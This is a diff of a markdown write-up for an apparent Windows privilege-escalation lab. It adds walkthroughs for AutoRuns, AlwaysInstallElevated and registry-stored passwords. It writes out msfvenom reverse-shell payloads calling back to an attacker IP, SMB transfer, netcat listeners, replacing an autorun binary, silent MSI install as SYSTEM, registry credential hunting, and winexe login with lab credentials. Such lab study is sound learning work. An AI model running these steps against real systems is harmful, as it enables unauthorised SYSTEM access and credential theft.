@@ -97,7 +97,7 @@
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
 ```
 
-- **`msfvenom`** : Tool to create payload
+- **`msfvenom`** : Tool from Metasploit used to generate payloads.
 - **`-p windows/x64/shell_reverse_tcp`** : Reverse shell type
 - **`LHOST`** : Device IP that will recive the shell in this case will be my kali machine
 - **`LPORT`** : port that shell will connect to it on kali
@@ -111,9 +111,18 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o r
 ```ruby
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
 ```
+### **`or it's alias`**
+
+```ruby
+impacket-smbserver kali . -smb2support
+```
+
+
 
 - **`kali`** : name share
 - **`.`** : files that will avilable in the share here in current folder
+- **`-smb2support`** : It makes the server support the SMBv2 protocol (important because modern Windows often does not accept SMBv1).
+
 
 **`on Windows Device`**
 
@@ -850,18 +859,207 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 - <details>
      <summary>AutoRuns</summary>
 
-
-
-
+     
+     
+     ## 1. Query the registry for AutoRun executables
+     
+     ```ruby
+     reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+     ```
+     
+     - **`reg`** : A tool for managing the registry in Windows (query, add, delete...).
+     - **`query`** : It means "View the contents of the key" (read only).
+     - **`HKLM`** : HKEY_LOCAL_MACHINE shortcut (part of the registry that stores system settings for all users).
+     - **`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`** : The key that stores programs that start automatically when the system starts (Autoruns).
+     
+     
+     <img width="728" height="147" alt="image" src="https://github.com/user-attachments/assets/16f69e3c-fea4-4bb8-96e5-fefde26211f3" />
+     
+     ```ruby
+           "C:\Program Files\Autorun Program\program.exe"
+     ```
+     
+     
+     > ---
+     > ### 📌 _The goal is to see which programs start automatically with every restart or login._
+     > ---
+     
+     ## 2. Check file permissions with AccessChk
+     
+     
+     ```ruby
+     C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+     ```
+     
+     - **`accesschk.exe`** : Tool from _Sysinternals_
+     - **`/accepteula`** : It means "I agree to the user agreement" (required the first time).
+          - **`-uvw`**
+             - **`u`** : show user-specific permissions
+             - **`v`** : `verbose` More detail
+             - **`w`** : It focuses on write permissions (who has the authority to write to the file).
+     - **`"C:\Program Files\Autorun Program\program.exe"`** : The executable file of the program that runs automatically.
+     
+     
+     <img width="782" height="350" alt="image" src="https://github.com/user-attachments/assets/17076342-3a83-4c72-b480-87831a635f8d" />
+     
+     ```ruby
+      RW Everyone
+             FILE_ALL_ACCESS
+     ```
+     
+     
+     > ---
+     > ### 📌 _The goal → Check if this file is writable by any user (Everyone or BUILTIN\Users). If ah → this is a big weakness._
+     > ---
+     
+     
+     ## 3. Overwrite the AutoRun executable
+     
+     ```ruby
+     copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+     ```
+     
+     <img width="799" height="84" alt="image" src="https://github.com/user-attachments/assets/083692ef-67ad-4936-902c-7a9e67ff94e1" />
+     
+     
+     > ---
+     > ### 📌 _Goal → Replace the program that runs automatically (program.exe) with our reverse shell._
+     > ---
+     
+     
+     ## 4. Start a listener on Kali
+     
+     ```ruby
+     nc -lvnp 4444
+     ```
+     
+     
+     ## 5. Open a new RDP session to trigger
+     
+     ```ruby
+     rdesktop 10.10.110.227
+     ```
+     
+     > login with 
+     
+     ```css
+     admin : password123
+     ```
+     
+     <img width="515" height="291" alt="image" src="https://github.com/user-attachments/assets/a961e489-b99d-4bc2-b54b-b2f3e9a001f8" />
+     
+     ---
+     
+     <img width="1563" height="800" alt="image" src="https://github.com/user-attachments/assets/28d8261b-470d-49f0-a6f4-fdf1f704b37a" />
+     
+     
+     > ---
+     > ### 📌 _Shell will return with the privileges of the user who loged in_
+     > ---
+     
 
   </details>
 
 
 
+
+
+
+
+
+
 - <details>
      <summary>AlwaysInstallElevated</summary>
-
-
+     
+     
+     ## 1. Query the registry for AlwaysInstallElevated keys
+     
+     ```ruby
+     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+     ```
+     
+     - **`reg`** : A tool for managing the registry in Windows (query, add, delete...).
+     - **`query`** : It means "View the contents of the key" (read only).
+     - **`HKLM`** : HKEY_LOCAL_MACHINE shortcut (part of the registry that stores system settings for all users).
+     - **`HKCU`** : HKEY_CURRENT_USER shortcut (settings specific to the current user).
+     - **`\SOFTWARE\Policies\Microsoft\Windows\Installer`** : Path to Windows Installer settings.
+     - **`/v AlwaysInstallElevated`** : It means "Show me the value of the entry called `AlwaysInstallElevated`".
+     
+     <img width="846" height="236" alt="image" src="https://github.com/user-attachments/assets/d9c6095b-91f8-481b-993e-ddd252f7b347" />
+     
+     
+     > ---
+     > ### 📌 _Goal → Make sure that the two keys are present and set to 1 `(0x1)` → if yes That is mean any ``MSI package`` can be installed with `SYSTEM privileges`._
+     > ---
+     
+     
+     ## 2. Generate malicious MSI with msfvenom (on Kali)
+     
+     
+     ```ruby
+     msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.47.102 LPORT=4444 -f msi -o reverse.msi
+     ```
+     
+     - **`msfvenom`** : Tool from Metasploit used to generate payloads.
+     - **`-p windows/x64/shell_reverse_tcp`** : Reverse shell type
+     - **`LHOST`** : Device IP that will recive the shell in this case will be my kali machine
+     - **`LPORT`** : port that shell will connect to it on kali
+     - **`-f msi`** : output file type `msi`
+     - **`-o reverse.msi`** : put the output in file call ``reverse.msi``
+     
+     
+     > ---
+     > ### 📌 _Goal → Create a malicious MSI file that opens Reverse Shell._
+     > ---
+     
+     
+     ## 3. Transfer the MSI to Windows
+     
+     **`on kali`**
+     
+     ```ruby
+     impacket-smbserver frank . -smb2support
+     ```
+     
+     **`on windows`**
+     
+     ```ruby
+     copy \\10.8.47.102\frank\reverse.msi C:\PrivEsc\
+     ```
+     
+     <img width="1799" height="528" alt="image" src="https://github.com/user-attachments/assets/67da4d1c-c81c-4fd5-9cda-07fc681b94d5" />
+     
+     
+     
+     ## 4. Start a listener on Kali
+     
+     ```ruby
+     nc -lvnp 4444
+     ```
+     
+     
+     ## 5. Run the malicious MSI on Windows
+     
+     ```ruby
+     msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+     ```
+     
+     - **`msiexec`** : Windows Installer (responsible for installing .msi).
+     - **`/quiet`** : install program without any GUI or popups.
+     - **`/qn`** : Same idea (Quiet with No UI).
+     - **`/i`** : install package
+     - **`C:\PrivEsc\reverse.msi`** : The file we want to install.
+     
+     > ---
+     > ### 📌 _Goal → Since `AlwaysInstallElevated=1` in `HKLM and HKCU` → any MSI installed will be installed as SYSTEM.Therefore, our reverse shell runs directly with SYSTEM privileges._
+     > ---
+     
+     
+     <img width="1299" height="269" alt="image" src="https://github.com/user-attachments/assets/dacdf0e5-a030-40cb-a0bf-983259fa7f6d" />
+     
+     
+     
 
 
 
@@ -889,8 +1087,140 @@ copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 
 <details>
-  <summary></summary>
+  <summary>Passwords</summary>
+
+
+
+
+- <details>
+     <summary>Registry</summary>
+
+     
+     >[!note]
+     > **`(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123)`**
+     
+     
+     ## 1. Search for the word "password" in the registry
+     
+     ```ruby
+     reg query HKLM /f password /t REG_SZ /s
+     ```
+     
+     - **`reg`** : A tool for managing the registry in Windows (query, add, delete...).
+     - **`query`** : It means "View the contents of the key" (read only).
+     - **`HKLM`** : HKEY_LOCAL_MACHINE shortcut (part of the registry that stores system settings for all users).
+     - **`/f password`** : /f means “filter” → Here we look for the text “password”.
+     - **`/t REG_SZ`** : This means looking for values ​​of type string.
+     - **`/s`** : `search recursively` (Searches all subkeys)
+     
+     
+     > ---
+     > ### 📌 _Goal → To see if anywhere in the registry there is a password stored in plain text._
+     > ---
+     
+     
+     ## 2. Search directly for AutoLogon key
+     
+     
+     ```ruby
+     reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+     ```
+     
+     - It goes directly to Winlogon key.
+     - In some systems, this contains values ​​like:
+        - **`DefaultUserName`**
+        - **`DefaultPassword`**
+        - **`AutoAdminLogon`**
+     
+     <img width="971" height="611" alt="image" src="https://github.com/user-attachments/assets/a727bcec-3976-4a4b-a097-53c290ca3265" />
+     
+          
+     
+     > ---
+     > ### 📌 _Goal → To access the stored admin username and password so that the system performs an automatic login._
+     > ---
+     
+     
+     ## 3. Executing a command on the system using Winexe
+     
+     ```ruby
+     winexe -U 'admin%password' //10.10.194.107 cmd.exe
+     ```
+     
+     - **`winexe`** : A tool that allows you to run commands on a Windows machine from a remote Linux machine (similar to PsExec).
+     - **`-U 'admin%password'`** :
+        - **`-U`** : user
+        - **`'admin%password'`** : Here we specify the username and password in the form `username%password`.
+          - **`Example`** : `'admin%password123'`.
+     - **`cmd.exe`** : The program we want to run on the target device (here is the command prompt).
+     
+     
+     <img width="919" height="322" alt="image" src="https://github.com/user-attachments/assets/b1522bdc-bc17-4ef9-94ac-fa01a0d493c1" />
+     
+     
+     
+     
+     > ---
+     > ### 📌 _Goal → Command Prompt will open for you with Administrator privileges on the target device while you are running Kali._
+     > ---
+
+
+
+
+  </details>
+
+
+
+
+
+
+
+
+
+- <details>
+     <summary></summary>
+  </details>
+
+
+- <details>
+     <summary></summary>
+  </details>
+
+
+- <details>
+     <summary></summary>
+  </details>
+
+
+
+
+
+
+
+
+     
 </details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 <details>
   <summary></summary>
